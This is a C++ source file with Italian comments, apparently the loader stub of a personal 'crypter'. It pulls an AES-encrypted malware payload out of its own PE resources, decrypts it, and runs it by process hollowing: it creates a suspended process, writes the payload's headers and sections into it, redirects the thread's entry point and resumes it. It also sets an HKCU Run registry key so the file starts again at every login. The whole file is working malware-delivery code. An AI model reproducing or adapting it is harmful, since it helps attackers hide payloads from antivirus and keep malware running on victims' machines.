#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>


int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


//funzione che prende le risorse di un PE
unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) { 
    HGLOBAL hResData; 
    HRSRC   hResInfo; // handle to resource info in hModule
    unsigned char* pvRes; // pointer to resource data buffer
    HMODULE hModule = GetModuleHandle(NULL); // handle to DLL module

    // find the resource Load the resource and lock it
    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL)) 
    {
        *dwSize = SizeofResource(hModule, hResInfo); //mi salvo la grandezza delle risorse
        return 	pvRes;
    }
    // quit if no resource found
    *dwSize = 0;
    return 0;
}


/*typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;
  HANDLE hThread;
  DWORD  dwProcessId;
  DWORD  dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;*/

int main(){
    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
    unsigned long malwareLen;
    unsigned long keyLen;

    unsigned char* key;

    //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
    key = GetResource(420,"BIN", &keyLen);

    for(int i = 0; i< 32; i++){
        printf("%x\n", key[i]);
    }
    unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
    memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
    printf("%d",malwareLen);

    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe

    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
    Sleep(1500);
    for(int i = 0; i < 2000; i++){
        printf("%c", malware[i]);
    }
    Sleep(3000);
    //Adesso arriva la roba strana del RunPE

    printf("prima degli header");


    IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
    IMAGE_NT_HEADERS64* NtHeader; // NT header ovvero i successivi 248 byte del nostro malware e secondo header del PE
    IMAGE_SECTION_HEADER* SectionHeader; // Section header ovvero i successivi 40 byte del nostro malware e header delle sezioni del PE

    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.

    void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE
////////////////////////
    char currentFilePath[1024]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
/////////////////////////
    DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
    // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header

    //checko se il NT header e' valido: dal msdn:
    //Signature:
    //A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".

    printf("magic number DOS_header: %d", DOSHeader->e_magic);

    printf("\nprima del check della signature");
    printf("\nNtHeader: %p", (void*)NtHeader);
    printf("\nNtHeader->Signature: %d", NtHeader->Signature);
    printf("\nIMAGE_NT_SIGNATURE: %d", IMAGE_NT_SIGNATURE);

    Sleep(3000);
    if(NtHeader->Signature == IMAGE_NT_SIGNATURE){
        ZeroMemory(&PI, sizeof(PI)); // pulisco la memoria della struct PROCESS_INFORMATION e STARTUPINFOA
        ZeroMemory(&SI, sizeof(SI));
        //al posto di NULL posso specificare il path di un altro file .exe valido come ad esempio notepad.exe
        printf("\nPRIMA GetModuleFileNameA");
        Sleep(3000);          
        GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
        printf("\n\nDOPO GetModuleFileNameA");
        Sleep(3000);
        if(TRUE){  //AGGIUNGERE argomento da linea di comando
            printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
            HKEY hkey = NULL;
            // malicious app
            const char* exe = currentFilePath;

            // startup
            LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
            if (res == ERROR_SUCCESS) {
                // create new registry key
                RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                RegCloseKey(hkey);
            }     
        }
        /*BOOL CreateProcessA(
            [in, optional]      LPCSTR                lpApplicationName,
            [in, out, optional] LPSTR                 lpCommandLine,
            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
            [in]                BOOL                  bInheritHandles,
            [in]                DWORD                 dwCreationFlags,
            [in, optional]      LPVOID                lpEnvironment,
            [in, optional]      LPCSTR                lpCurrentDirectory,
            [in]                LPSTARTUPINFOA        lpStartupInfo,
            [out]               LPPROCESS_INFORMATION lpProcessInformation
        );*/
        //creo processo in stato sospeso e salvo i valori nelle struct SI e PI

        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

            CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare
            // alloco memoria per la struct CONTEXT
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
            CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare
            /*BOOL GetThreadContext(
            [in]      HANDLE    hThread,
            [in, out] LPCONTEXT lpContext
            );*/
            printf("DOPO Aver creato il processo");
            Sleep(3000);
            //ormai il thread si puo' accesere da PI.hThread perche 
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) { // prendo i registri del processo che vogliamo attaccare 
                //VirtualAllocEx alloca memoria in un processo esterno dal corrente
                pImageBase = VirtualAllocEx( // alloco memoria nel processo che vogliamo attaccare
                        PI.hProcess,
                        LPVOID(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,   // alloco la stessa memoria che occupa il malware
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
            );
        //WriteProcessMemory Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.


        /*BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
        );*/

            // scrivo il mio PE malware nella memoria che ho allocato nel processo
            WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL); 
            // assegno e alloco tutte le sezioni del PE nella memoria che ho allocato nel processo
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    /*typedef struct _IMAGE_SECTION_HEADER {
                    BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
                    union {
                        DWORD PhysicalAddress;
                        DWORD VirtualSize;
                    } Misc;
                    DWORD VirtualAddress;
                    DWORD SizeOfRawData;
                    DWORD PointerToRawData;
                    DWORD PointerToRelocations;
                    DWORD PointerToLinenumbers;
                    WORD  NumberOfRelocations;
                    WORD  NumberOfLinenumbers;
                    DWORD Characteristics;
                    } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;*/


                    // prendo l' i-esima sezione del PE
                    //per calcolarmi l'offset faccio cosi:
                    //ricordiamo (DWORD64(pe) + DOSHeader->e_lfanew) = indirizzo del NT header 
                    //perche' sommo 264 + i*40? perche' 264 e' l' offset del primo section header rispetto all' inizio del NT header, e' i*40? perche' ogni section header e' lungo 40 byte
                    //STA ROBA E' ASSURDA, PER FARSELA DA SOLI TOCCHEREBBE METTERSI A DEBUGGARE LA ROBA O USARE PE-BEAR
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
                    //scrivo le varie sezioni del mio PE malware
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),//sempre usare virtualAddress, ricorda che l' indirizzo fisico e' dinamico per la allocazione dinamica
                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                    );
                    //NNON NE HO LA MINIMA IDEA
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(CTX->Rdx + 0x10),
                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
                            8,
                            NULL
                    );

                }


    
                // setto il registro Rcx del processo  all' entry point del PE malware
                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;

                //setto il contesto (i registri del Process Control Bloc)
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));

                HKEY hkey = NULL;
                // malicious app
                const char* exe = currentFilePath;

                // startup
                LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
                if (res == ERROR_SUCCESS) {
                    // create new registry key
                    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                    RegCloseKey(hkey);
                }

                
                //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                ResumeThread(PI.hThread);

                WaitForSingleObject(PI.hProcess, NULL);

                return 0;
            }
        }
    }
}
